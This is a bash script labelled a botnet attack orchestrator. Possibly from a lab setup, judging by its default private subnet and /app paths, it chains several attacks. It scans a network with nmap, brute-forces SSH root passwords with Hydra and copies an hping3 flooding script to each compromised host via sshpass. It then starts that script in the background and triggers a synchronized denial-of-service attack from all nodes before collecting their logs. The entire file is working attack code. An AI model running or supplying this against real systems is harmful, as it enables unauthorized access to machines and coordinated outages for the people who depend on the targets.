#!/bin/bash
# Botnet Attack Orchestrator
# Runs on botnet-node
# Phase 1: Scan for SSH targets in target network
# Phase 2: SSH brute-force via Hydra
# Phase 3: Deploy hping3_attack.sh to ALL compromised nodes (deploy-only, no run)
# Phase 4: Trigger ALL nodes simultaneously for synchronized attack
#
# Synchronized attack: all compromised nodes start/stop hping3 at the same time
# via a trigger file (/tmp/.hping3_start) mechanism.

TARGET_NETWORK="${TARGET_NETWORK:-192.168.200.0/24}"
SSH_USER="${SSH_USER:-root}"
PASSWORD_LIST="${PASSWORD_LIST:-/app/ssh_weak_passwords.txt}"
ATTACK_TARGET_IP="${ATTACK_TARGET_IP:-}"
ATTACK_START="${ATTACK_START:-60}"
ATTACK_STOP="${ATTACK_STOP:-120}"

echo "[*] ============================================"
echo "[*] Botnet Attack Orchestration"
echo "[*] Target Network: $TARGET_NETWORK"
echo "[*] SSH User: $SSH_USER"
echo "[*] Password List: $PASSWORD_LIST"
echo "[*] Attack Target IP: $ATTACK_TARGET_IP"
echo "[*] Attack Window: T+${ATTACK_START}s to T+${ATTACK_STOP}s"
echo "[*] ============================================"

# Phase 1: Discover live hosts with nmap
echo "[*] Phase 1: Discovering live hosts in $TARGET_NETWORK..."
nmap -sn $TARGET_NETWORK -oN /app/results/nmap_live_hosts.txt 2>&1
cat /app/results/nmap_live_hosts.txt

# Extract live host IPs
LIVE_HOSTS=$(grep -oP 'Nmap scan report for \K[\d.]+' /app/results/nmap_live_hosts.txt)
echo "[*] Live hosts found: $LIVE_HOSTS"

# Phase 2: Find SSH-enabled hosts
echo "[*] Phase 2: Scanning for SSH services..."
nmap -p 22 --open -oG - $TARGET_NETWORK > /app/results/ssh_scan.txt 2>&1
grep -oP 'Host: \K[\d.]+' /app/results/ssh_scan.txt > /app/results/ssh_targets.txt

if [ ! -s /app/results/ssh_targets.txt ]; then
  echo "[-] No SSH targets found. Exiting."
  exit 1
fi

SSH_TARGETS=$(cat /app/results/ssh_targets.txt)
echo "[*] SSH targets: $SSH_TARGETS"

# Phase 3: SSH Brute-Force with Hydra
# Track all compromised nodes for synchronized attack later
declare -a COMPROMISED_IPS=()
declare -A COMPROMISED_PWDS=()

echo "[*] Phase 3: SSH Brute-Force Attack"
for target in $SSH_TARGETS; do
  # Skip if already compromised (dedup guard)
  if [[ " ${COMPROMISED_IPS[@]} " =~ " $target " ]]; then
    echo "[*] Skipping $target — already compromised."
    continue
  fi

  echo "[*] Attempting Hydra SSH brute-force on $target..."

  # Run Hydra with timeout
  hydra -l $SSH_USER -P $PASSWORD_LIST -s 22 -f -t 4 -V $target ssh 2>&1 | tee /app/results/hydra_${target//\./_}.log

  # Extract password from Hydra verbose output
  PASSWORD=$(grep -oP 'password: \K.*' /app/results/hydra_${target//\./_}.log | head -1)

  if [ -n "$PASSWORD" ]; then
    echo "[+] ============================================"
    echo "[+] COMPROMISED: $target (password: $PASSWORD)"
    echo "[+] ============================================"
    COMPROMISED_IPS+=("$target")
    COMPROMISED_PWDS["$target"]="$PASSWORD"
  else
    echo "[-] Failed to compromise $target"
  fi
done

if [ ${#COMPROMISED_IPS[@]} -eq 0 ]; then
  echo "[-] No nodes compromised. Exiting."
  exit 1
fi

echo "[*] ============================================"
echo "[*] Total nodes compromised: ${#COMPROMISED_IPS[@]}"
echo "[*] Nodes: ${COMPROMISED_IPS[*]}"
echo "[*] ============================================"

# Phase 4a: DEPLOY — copy hping3_attack.sh to ALL compromised nodes
echo "[$(date +%T.%N)] Phase 4a: Deploying hping3 attack script to ${#COMPROMISED_IPS[@]} compromised nodes..."
for target in "${COMPROMISED_IPS[@]}"; do
  PASSWORD="${COMPROMISED_PWDS[$target]}"
  echo "[$(date +%T.%N)] Phase 4a: Deploying to $target..."
  sshpass -p "$PASSWORD" scp -o StrictHostKeyChecking=no /app/hping3_attack.sh "$SSH_USER@$target:/tmp/hping3_attack.sh" 2>&1 | tee -a /app/results/deployment.log
  echo "[$(date +%T.%N)] [+] Deployed to $target"
done

# Phase 4b: LAUNCH — start hping3_attack.sh in background on each node
# The script internally waits for /tmp/.hping3_start trigger, so nothing happens yet.
echo "[*] Phase 4b: Launching hping3_attack.sh in background on all nodes..."
for target in "${COMPROMISED_IPS[@]}"; do
  PASSWORD="${COMPROMISED_PWDS[$target]}"
  echo "[$(date +%T.%N)] Phase 4b: Launching on $target (IP=$ATTACK_TARGET_IP START=$ATTACK_START STOP=$ATTACK_STOP)..."
  # Use timeout as safety net (30s). Heredoc avoids quoting issues.
  # Chain: timeout -> sshpass -> ssh. Also add SSH ConnectTimeout.
  timeout 30 sshpass -p "$PASSWORD" ssh -T -o StrictHostKeyChecking=no -o ConnectTimeout=10 "$SSH_USER@$target" <<EOF
chmod +x /tmp/hping3_attack.sh
nohup bash /tmp/hping3_attack.sh $ATTACK_TARGET_IP $ATTACK_START $ATTACK_STOP </dev/null >/tmp/hping3.log 2>&1 &
disown
EOF
  RC=$?
  echo "[$(date +%T.%N)] [+] hping3_attack.sh launched on $target (SSH exit code: $RC)"
done

# Brief stagger to ensure background processes are ready on all nodes
sleep 1
echo "[$(date +%T.%N)] Stagger complete. Proceeding to trigger..."

# Phase 5: TRIGGER — synchronized start on ALL nodes at once
echo "[$(date +%T.%N)] Phase 5: Triggering synchronized hping3 attack on ${#COMPROMISED_IPS[@]} nodes..."
for target in "${COMPROMISED_IPS[@]}"; do
  PASSWORD="${COMPROMISED_PWDS[$target]}"
  echo "[$(date +%T.%N)] Phase 5: Sending trigger to $target..."
  sshpass -p "$PASSWORD" ssh -T -o StrictHostKeyChecking=no "$SSH_USER@$target" \
    "touch /tmp/.hping3_start" 2>&1 &
done
wait  # Wait for all trigger commands to finish
echo "[$(date +%T.%N)] All compromised nodes triggered simultaneously."
echo "[$(date +%T.%N)] Attack window: T+${ATTACK_START}s to T+${ATTACK_STOP}s"

# Phase 6: Wait for attack to finish, then verify
echo "[$(date +%T.%N)] Phase 6: Waiting for attack to complete (T+${ATTACK_STOP}s)..."
sleep $((ATTACK_STOP + 5))

echo "[$(date +%T.%N)] Phase 6: Verifying attack results..."
for target in "${COMPROMISED_IPS[@]}"; do
  PASSWORD="${COMPROMISED_PWDS[$target]}"
  echo "--- Results from $target ---"
  sshpass -p "$PASSWORD" ssh -T -o StrictHostKeyChecking=no "$SSH_USER@$target" \
    "cat /var/log/hping3_attack.log 2>/dev/null; cat /tmp/hping3.log 2>/dev/null" 2>&1 | tee -a /app/results/deployment.log
done

echo "[$(date +%T.%N)] ============================================"
echo "[$(date +%T.%N)] Attack orchestration complete"
echo "[$(date +%T.%N)] ============================================"